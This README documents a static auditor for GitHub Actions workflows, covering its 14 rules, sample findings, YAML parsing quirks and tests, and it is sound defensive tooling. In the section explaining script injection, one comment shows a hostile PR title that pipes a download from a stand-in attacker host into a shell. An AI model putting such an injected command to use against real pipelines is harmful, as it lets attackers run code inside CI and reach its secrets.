# actions-audit

A **static** auditor for GitHub Actions workflow files. Point it at a repository,
a `.github/workflows/` directory, or a single workflow file and it reports
supply-chain and reliability risks, each with a concrete fix.

No installation, no dependencies, no network calls. It reads YAML and reasons
about what it finds; it never runs a workflow, never resolves an action, and
never touches your runner.

```
python3 actions_audit.py .                       # audit a whole repository
python3 actions_audit.py .github/workflows/      # audit a directory of workflows
python3 actions_audit.py .github/workflows/ci.yml
```

---

## Why this exists

Pinning `uses: actions/checkout@v4` is the single most common GitHub Actions
mistake that has real consequences: the `v4` tag is a movable pointer, so
whoever controls that repository can change the code your pipeline runs without
any commit appearing in your repository. The same class of mistake shows up in
`pull_request_target` jobs that check out PR code, in `run:` blocks that
interpolate a PR title straight into a shell command, and in deploys that keep
going after a failure.

`actions-audit` finds those patterns and tells you how to fix each one.

---

## Install-free usage

There is nothing to install. Copy the directory and run the script with the
Python interpreter you already have:

```bash
cd actions-audit
python3 actions_audit.py --help
```

Requires Python 3.8 or newer. **Standard library only** — PyYAML is used if it
happens to be importable, but it is not required (see
[YAML handling and the `on:` trap](#yaml-handling-and-the-on-trap)).

### Options

```
usage: actions-audit [-h] [--json] [--severity {high,medium,low}] [--quiet]
                     [--list-rules] [--no-color] [--native-yaml] [--version]
                     [path ...]

positional arguments:
  path                  workflow file, directory of workflows, or repository
                        root

options:
  -h, --help            show this help message and exit
  --json                emit machine-readable JSON instead of text
  --severity {high,medium,low}
                        minimum severity that makes the exit code 1 (default:
                        medium). All findings are still shown.
  --quiet               suppress the per-file header and notes; print findings
                        only
  --list-rules          list every rule with its severity and fix, then exit 0
  --no-color            disable ANSI colour (colour is off automatically when
                        stdout is not a terminal)
  --native-yaml         use the built-in YAML reader instead of PyYAML (for
                        environments without PyYAML, and for testing parity)
  --version             show program's version number and exit
```

`<path>` accepts a file, a directory, or a repository root. For a repository
root it looks in `.github/workflows/` for `*.yml` and `*.yaml`.

### Exit codes

| Code | Meaning |
| ---- | ------- |
| `0`  | No findings at or above the failure threshold. |
| `1`  | At least one finding at or above the failure threshold. |
| `2`  | Usage error, unreadable path, or YAML that could not be parsed. |

The **failure threshold** defaults to `medium` and is moved with
`--severity`. This is deliberately separate from what gets *reported*: **every*
finding is always printed, whatever the threshold. A `low` finding is advisory —
it tells you something is wrong, but on its own it will not fail your build.
`--severity high` therefore means "only high findings fail the run", not "hide
everything else".

```bash
python3 actions_audit.py . --severity high     # exit 1 only for high findings
python3 actions_audit.py . --quiet --json      # findings as JSON, for CI
```

A typical CI step:

```yaml
- name: Audit workflows
  run: python3 actions_audit.py . --severity high
```

---

## What it checks

14 rules. `python3 actions_audit.py --list-rules` prints this list with the full
fix text for each.

| Rule | Severity | What it catches |
| ---- | -------- | --------------- |
| `mutable-action-ref` | high | `uses:` pinned to a tag or branch (`@v4`, `@main`) instead of a 40-character commit SHA |
| `pull-request-target-code-execution` | high | `pull_request_target` combined with checking out or running PR-controlled code |
| `permissions-write-all` | high | `permissions: write-all` at workflow or job level |
| `script-injection` | high | `${{ github.event.* }}` and friends interpolated into a `run:` block |
| `workflow-run-checkout` | high | A `workflow_run` job checking out the triggering run's revision |
| `continue-on-error-deploy` | high | `continue-on-error: true` on a job or step that gates a deploy |
| `permissions-missing` | medium | No top-level `permissions:` block, so `GITHUB_TOKEN` inherits the repository default |
| `fork-secret-unavailable` | medium | `secrets.*` referenced in a fork-triggered `pull_request` workflow |
| `job-timeout-missing` | medium | A job with no `timeout-minutes` |
| `concurrency-missing-deploy` | medium | A deploy/publish workflow with no `concurrency` group |
| `checkout-persist-credentials` | medium | `actions/checkout` leaving the token in git config while later steps run untrusted code |
| `self-hosted-runner` | medium | A self-hosted runner (dangerous if the repository is public) |
| `always-on-publish` | medium | `if: always()` on a step that publishes or deploys |
| `cache-key-no-lockfile` | low | A cache key with no dependency-lockfile hash |

### Safe `env:` versus unsafe `run:`

The script-injection rule distinguishes the two places an expression can appear,
because only one of them is dangerous:

```yaml
# SAFE -- the shell reads the value as data, never as syntax
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: printf '%s\n' "$PR_TITLE"

# UNSAFE -- GitHub substitutes the title into the script *before* the shell
# parses it, so a title like  x'; curl attacker.example | sh; echo '  runs
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

A handful of contexts are treated as trusted (`github.repository`, `github.sha`,
`github.event.pull_request.number`, `github.event.pull_request.base.sha`, and
similar identifiers). Everything under `github.event.*`, plus `github.head_ref`,
`github.base_ref`, `github.ref_name`, `github.actor`, and `inputs.*`, is treated
as attacker-influenced.

---

## Example output

### A badly configured workflow

Real output — `python3 actions_audit.py tests/fixtures/bad-workflow.yml`, exit
code `1`:

```
tests/fixtures/bad-workflow.yml
  yaml backend: pyyaml   trigger key 'on:' parsed as: true
  events: pull_request, workflow_run
  note: YAML 1.1 readers turn the unquoted key 'on:' into the boolean true; actions-audit normalises it back to the 'on' trigger block.

tests/fixtures/bad-workflow.yml:30: [HIGH] continue-on-error-deploy: Publish/deploy step 'Publish results' in job 'pr-gate' sets continue-on-error: true.
    fix: Remove continue-on-error from the publish/deploy step, or move the step to a non-gating job.
tests/fixtures/bad-workflow.yml:18: [HIGH] mutable-action-ref: actions/checkout is pinned to the mutable ref '@v4'.
    fix: Pin it: 'actions/checkout@<40-char-commit-sha> # v4'. Resolve the tag with 'git ls-remote https://github.com/actions/checkout refs/tags/v4' (or copy the commit SHA from the release page), then keep the version in the trailing comment.
tests/fixtures/bad-workflow.yml:37: [HIGH] mutable-action-ref: actions/checkout is pinned to the mutable ref '@v4'.
    fix: Pin it: 'actions/checkout@<40-char-commit-sha> # v4'. Resolve the tag with 'git ls-remote https://github.com/actions/checkout refs/tags/v4' (or copy the commit SHA from the release page), then keep the version in the trailing comment.
tests/fixtures/bad-workflow.yml:41: [HIGH] mutable-action-ref: actions/setup-node is pinned to the mutable ref '@v4'.
    fix: Pin it: 'actions/setup-node@<40-char-commit-sha> # v4'. Resolve the tag with 'git ls-remote https://github.com/actions/setup-node refs/tags/v4' (or copy the commit SHA from the release page), then keep the version in the trailing comment.
tests/fixtures/bad-workflow.yml:45: [HIGH] mutable-action-ref: docker/build-push-action is pinned to the mutable ref '@v6'.
    fix: Pin it: 'docker/build-push-action@<40-char-commit-sha> # v6'. Resolve the tag with 'git ls-remote https://github.com/docker/build-push-action refs/tags/v6' (or copy the commit SHA from the release page), then keep the version in the trailing comment.
tests/fixtures/bad-workflow.yml:48: [HIGH] mutable-action-ref: softprops/action-gh-release is pinned to the mutable ref '@v2'.
    fix: Pin it: 'softprops/action-gh-release@<40-char-commit-sha> # v2'. Resolve the tag with 'git ls-remote https://github.com/softprops/action-gh-release refs/tags/v2' (or copy the commit SHA from the release page), then keep the version in the trailing comment.
tests/fixtures/bad-workflow.yml:52: [HIGH] mutable-action-ref: actions/cache is pinned to the mutable ref '@v3'.
    fix: Pin it: 'actions/cache@<40-char-commit-sha> # v3'. Resolve the tag with 'git ls-remote https://github.com/actions/cache refs/tags/v3' (or copy the commit SHA from the release page), then keep the version in the trailing comment.
tests/fixtures/bad-workflow.yml:11: [HIGH] permissions-write-all: Workflow-level permissions: write-all grants every scope.
    fix: Replace write-all with explicit per-scope read/write entries.
tests/fixtures/bad-workflow.yml:24: [HIGH] script-injection: run: block in job 'pr-gate' interpolates ${{ github.event.pull_request.title }} directly into shell text.
    fix: Pass the expression through env: and reference it as a quoted variable ($VAR / "${VAR}"). Values reach the shell as data, not as syntax.
tests/fixtures/bad-workflow.yml:24: [HIGH] script-injection: run: block in job 'pr-gate' interpolates ${{ github.head_ref }} directly into shell text.
    fix: Pass the expression through env: and reference it as a quoted variable ($VAR / "${VAR}"). Values reach the shell as data, not as syntax.
tests/fixtures/bad-workflow.yml:39: [HIGH] workflow-run-checkout: workflow_run job 'release' checks out ref '${{ github.event.workflow_run.head_sha }}', which is code from the triggering run rather than a trusted revision.
    fix: Set 'ref:' to an explicit commit SHA of trusted code, or consume only a named artifact and verify it before use.
tests/fixtures/bad-workflow.yml:29: [MEDIUM] always-on-publish: Step 'Publish results' in job 'pr-gate' publishes or deploys but is guarded by if: always(), so it runs after failures too.
    fix: Use 'if: success()' for publish/deploy steps; keep always() only for notifications and log uploads.
tests/fixtures/bad-workflow.yml:37: [MEDIUM] checkout-persist-credentials: Job 'release' runs actions/checkout without persist-credentials: false, then runs further commands in an untrusted-trigger workflow.
    fix: Add 'persist-credentials: false' to the checkout step's with: block, and pass GITHUB_TOKEN explicitly to the few steps that need it.
tests/fixtures/bad-workflow.yml:34: [MEDIUM] concurrency-missing-deploy: Workflow contains deploy/publish job(s) release but declares no concurrency group, so overlapping runs can race.
    fix: Add a workflow-level concurrency group keyed on the ref or environment, with cancel-in-progress: false for deploys.
tests/fixtures/bad-workflow.yml:15: [MEDIUM] job-timeout-missing: Job 'pr-gate' sets no timeout-minutes (default is 360 minutes).
    fix: Add 'timeout-minutes: 15' (or a value suited to the job) under the job.
tests/fixtures/bad-workflow.yml:34: [MEDIUM] job-timeout-missing: Job 'release' sets no timeout-minutes (default is 360 minutes).
    fix: Add 'timeout-minutes: 15' (or a value suited to the job) under the job.
tests/fixtures/bad-workflow.yml:34: [MEDIUM] self-hosted-runner: Job 'release' requests a self-hosted runner (self-hosted).
    fix: Use a GitHub-hosted runner for fork-reachable workflows, or make the self-hosted runner ephemeral and free of persistent secrets. Confirm the repository's visibility first.
tests/fixtures/bad-workflow.yml:44: [LOW] cache-key-no-lockfile: actions/setup-node is caching 'npm' in job 'release' without a lockfile path in cache-dependency-path.
    fix: Point cache-dependency-path at the lockfile (e.g. package-lock.json) so the cache key tracks dependency versions.
tests/fixtures/bad-workflow.yml:56: [LOW] cache-key-no-lockfile: Cache key 'npm-static' in job 'release' contains no dependency lockfile hash.
    fix: Add a lockfile hash to the key, e.g. '${{ runner.os }}-${{ hashFiles("**/package-lock.json") }}', and keep a restore-keys prefix.

19 finding(s): 11 high, 6 medium, 2 low
yaml backend used: pyyaml
17 finding(s) at or above 'medium' -- failing.
```

### A hardened workflow

`tests/fixtures/hardened.yml` is the negative control used by the test suite: it
must produce **zero** findings, not "few". Real output, exit code `0`:

```
tests/fixtures/hardened.yml
  yaml backend: pyyaml   trigger key 'on:' parsed as: true
  events: pull_request, push, workflow_dispatch
  note: YAML 1.1 readers turn the unquoted key 'on:' into the boolean true; actions-audit normalises it back to the 'on' trigger block.

0 finding(s): 0 high, 0 medium, 0 low
yaml backend used: pyyaml
```

The three things that make it clean, all of which are things a real workflow can
do today:

```yaml
permissions:
  contents: read            # explicit least privilege, not the repository default

concurrency:
  group: ci-${{ github.ref }}   # no overlapping runs
  cancel-in-progress: true

jobs:
  build:
    timeout-minutes: 15     # not the 360-minute default
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          persist-credentials: false
```

### JSON output

`--json` prints a single JSON document and nothing else, so it pipes straight
into a parser. Structure (trimmed):

```json
{
  "tool": "actions-audit",
  "version": "1.0.0",
  "summary": {"high": 11, "medium": 6, "low": 2, "total": 19},
  "files": [
    {
      "backend": "pyyaml",
      "on_key_parsed_as": "true",
      "triggers": ["pull_request", "workflow_run"],
      "jobs": ["pr-gate", "release"],
      "has_jobs": true,
      "file": "tests/fixtures/bad-workflow.yml",
      "findings": 19
    }
  ],
  "findings": [
    {
      "rule": "continue-on-error-deploy",
      "severity": "high",
      "path": "tests/fixtures/bad-workflow.yml",
      "line": 30,
      "message": "Publish/deploy step 'Publish results' in job 'pr-gate' sets continue-on-error: true.",
      "fix": "Remove continue-on-error from the publish/deploy step, or move the step to a non-gating job.",
      "evidence": "continue-on-error: true"
    }
  ]
}
```

---

## YAML handling and the `on:` trap

GitHub Actions workflow files are ordinary YAML, which brings one genuine trap
with it: **YAML 1.1 parses the unquoted scalar `on` as the boolean `true`.** A
YAML 1.1 reader therefore hands you a document whose top-level trigger key is
`True`, not the string `"on"`. Code that does `data["on"]` raises `KeyError` on
a perfectly valid workflow file — and the failure mode is nasty, because the
workflow itself is fine and only the reader is confused.

### Which path was verified here

**PyYAML is available in the environment this tool was built and tested in, and
it is what the default code path used.** Verified directly:

```
$ python3 -c "import yaml; print(yaml.__version__)"
6.0.2
```

and the tool reports its own choice in every run (`yaml backend used: pyyaml`
above). The observed PyYAML behaviour was confirmed by test:

```python
>>> yaml.safe_load("on:\n  pull_request:\n")
{True: {'pull_request': None}}     # PyYAML 6.0.2: the key is the boolean True
```

Because PyYAML cannot be assumed on a user's machine, `actions_audit/miniyaml.py`
also contains a **native reader** covering the YAML subset workflows actually use:
block mappings, block sequences, flow sequences and mappings, single- and
double-quoted scalars, block scalars (`|`, `>`, with `-`/`+` chomping and an
explicit indent indicator), comments, and multi-line flow collections. It runs
automatically when PyYAML is missing, or on demand with `--native-yaml`.

Both paths are tested, and the test suite asserts that **both backends produce
identical findings — rule, line number, message and fix — for every fixture**
(`test_backend_parity_across_all_fixtures`).

### How the trap is handled

The native reader keeps mapping keys exactly as written, so its trigger key is
the string `"on"`; PyYAML gives `True`. Both spellings, plus the string `"True"`,
are accepted by `miniyaml.get_workflow_triggers()`, and every run states which
spelling it actually saw:

```
  yaml backend: pyyaml   trigger key 'on:' parsed as: true
```

Tests cover all four cases (`on`, `"on"`, `True`, `"True"`), including the
end-to-end assertion that a trigger-dependent rule still fires when the key
arrived as a boolean.

### Malformed YAML

A file that cannot be parsed is a hard error, not a silent skip: the CLI prints
`actions-audit: error: <file>: line N: <problem>` to stderr and exits `2`. A file
containing multiple YAML documents is rejected too, because auditing half a file
and reporting "clean" would be worse than failing. A file with no YAML content at
all (empty, or comments only) is likewise a parse error.

### Line numbers

Findings carry the line of the token they are about — the step's `uses:`, the
`if: always()`, the `ref:` under a checkout — not the line of the enclosing job.
Both backends are asserted to agree on every line number for every fixture.

---

## Tests

```bash
python3 -m unittest discover -s tests -v
# or
python3 run_tests.py
```

Real result in this environment:

```
Ran 168 tests in 0.59s

OK
```

The suite contains 168 test methods and 268 `assert` statements (several
assertions run inside `subTest` loops, so the executed assertion count is
higher). It covers:

- **Every one of the 14 rules**, with both a positive case and at least one
  near-miss negative case (for example: `@v4` flagged, a 40-character SHA not;
  a `run:` interpolation flagged, the same expression in `env:` not).
- The **negative control**: `tests/fixtures/hardened.yml` must yield exactly
  zero findings on both backends.
- The **`on:` / `True` trap**, in all four key spellings, in both backends.
- **Malformed YAML**: bad indentation, an unbalanced flow collection, duplicate
  keys, comments-only input, multi-document input, and a top-level sequence.
- **CLI behaviour**: all three exit codes, `--severity`, `--quiet`, `--json`,
  `--list-rules`, `--native-yaml`, multi-path input, and directory/repository
  path expansion (including `*.yaml` and ignoring non-YAML files).
- **Backend parity** across every fixture.
- **Fixture hygiene**: no fixture may contain a realistic credential pattern.

The fixtures use obviously fake values (`CHANGEME`, `CHANGEME_DEPLOY_TOKEN`)
precisely so the repository can be published without tripping secret scanners.

---

## What this does not do

Stated plainly, because the value of a static checker depends on knowing its
limits:

- **It does not execute anything.** No workflow is run, no action is downloaded,
  no container is started, no network request is made. It reads text.
- **It cannot tell you what a pinned SHA actually contains.** Verifying that
  `actions/checkout@11bd719...` is the commit you think it is requires looking at
  the upstream repository. The tool only knows that the ref looks immutable, not
  that the code behind it is trustworthy. A pinned SHA to a malicious commit is
  still malicious.
- **It does not resolve expressions.** `${{ }}` is treated as opaque text. An
  action reference built from an expression cannot be judged, and is skipped
  rather than guessed at.
- **It does not know your repository's visibility.** The `self-hosted-runner`
  finding is reported for any self-hosted label, and the message says to confirm
  visibility, because a workflow file cannot tell public from private. The same
  caveat applies to whether a job is truly fork-reachable: trigger-level
  analysis is a good approximation, not a proof.
- **Deploy detection is heuristic.** A job counts as a deploy/publish job if its
  id, `name:`, or `environment:` contains a keyword such as `deploy`, `publish`,
  `release`, `prod`, `production`, `ship`, or `promote`, if it uses a known
  deployment action, or if a step runs `npm publish`, `docker push`,
  `gh release`, `kubectl apply`, `terraform apply` and similar. A job named
  `phase-two` that deploys to production will be missed. This rule is a prompt to
  look, not a guarantee.
- **Severities are judgement calls, not measurements.** "high" means "this is the
  pattern behind real-world compromises"; "medium" means "this bites regularly
  and is cheap to fix"; "low" means "advisory". Reasonable people differ, and a
  `low` finding in a throwaway internal workflow may deserve no action at all.
- **The untrusted-context list is deliberately conservative.** It flags contexts
  that an attacker can influence in *at least one* common trigger. In a workflow
  triggered only by `push` to a protected branch, several of those contexts are
  not attacker-controlled, so a `script-injection` finding there is a
  hardening suggestion rather than an active vulnerability.
- **It says nothing about whether a workflow is correct.** It does not validate
  action inputs, check that referenced secrets exist, verify that `needs:`
  targets exist, or lint YAML style. It is not a replacement for actionlint,
  zizmor, or `gh api` reviewing the workflow syntax.

### Claims about GitHub's documented behaviour

Where this README and the rule text assert something about how GitHub behaves,
the specific documented behaviour relied on is:

- An action reference of the form `owner/repo@ref` resolves `ref` at run time,
  and a tag or branch ref can move. *(That refs are mutable is a property of git;
  GitHub's "Security hardening for GitHub Actions" documentation recommends
  pinning to a full commit SHA for exactly this reason.)*
- `pull_request_target` runs in the context of the base repository, so it
  receives a read/write `GITHUB_TOKEN` and access to secrets, including for pull
  requests from forks — which is why combining it with checkout of PR-controlled
  code is the documented privilege-escalation footgun.
- Workflows triggered by `pull_request` from a fork do not receive repository
  secrets, and their `GITHUB_TOKEN` is read-only — which is why the
  `fork-secret-unavailable` finding says the reference resolves to an empty
  value rather than to a leaked secret.
- `workflow_run` runs in the base repository and therefore has secrets and a
  write token available, while the run that triggered it may have been a fork
  pull request.
- A job with no `timeout-minutes` uses GitHub's default job timeout, documented
  as **360 minutes** (6 hours) for GitHub-hosted runners.
- A repository's default `GITHUB_TOKEN` permission set is configurable, and the
  default was changed for repositories created after a certain date; older
  repositories can retain a broader default. The tool therefore describes a
  missing `permissions:` block as "inherits the repository default (historically
  read/write)" rather than asserting a single fixed scope list.
- `actions/checkout` persists the token in the local git configuration unless
  `persist-credentials: false` is set — that input is documented, and its default
  is `true`.

Anything in this tool that goes beyond the above is pattern-matching heuristics
and is labelled as such in the rule text. The behaviour claims above were **not**
re-verified against GitHub's documentation while writing this README in this
offline environment: they are stated from knowledge of the documented behaviour,
so treat them as **unverified here** and confirm against
<https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions>
before relying on any of them in a compliance context.

---

## Files

```
actions-audit/
├── actions_audit.py              # CLI entry point
├── aaudit/
│   ├── __init__.py
│   ├── auditor.py                # the 14 rules, path expansion, rendering
│   └── miniyaml.py               # PyYAML backend + native YAML subset reader
├── run_tests.py                  # convenience test runner
├── tests/
│   ├── __init__.py
│   ├── test_actions_audit.py     # 168 tests
│   └── fixtures/
│       ├── hardened.yml          # negative control: must produce zero findings
│       ├── bad-workflow.yml      # deliberately bad, hits 11 rules
│       ├── on-trap.yml           # the `on:` / True trap
│       ├── pull-request-target.yml
│       ├── fork-secrets.yml
│       ├── workflow-run.yml
│       └── invalid/
│           ├── malformed.yml     # bad indentation -> exit 2
│           └── empty.yml         # no YAML content -> exit 2
├── LICENSE
└── README.md
```

---

## Contributing

Rules live in `aaudit/auditor.py` and are registered with the `@rule` decorator,
which takes the id, title, severity, rationale and fix. A rule is a function
`(WorkflowContext) -> List[Finding]`; add a positive and a negative test for it
in `tests/test_actions_audit.py`, and a fixture if the rule needs one. Any new
rule must keep `test_backend_parity_across_all_fixtures` passing, which means it
may only read the parsed document and the recorded line map.

## Licence

MIT. See [LICENSE](LICENSE).

Copyright (c) 2025 duke5am

---

→ **[CI/CD Pipeline Reliability Pack](https://duke5am.gumroad.com/l/07-cicd-pipeline-pack)** — $29 on Gumroad <!-- GUMROAD-LINK -->
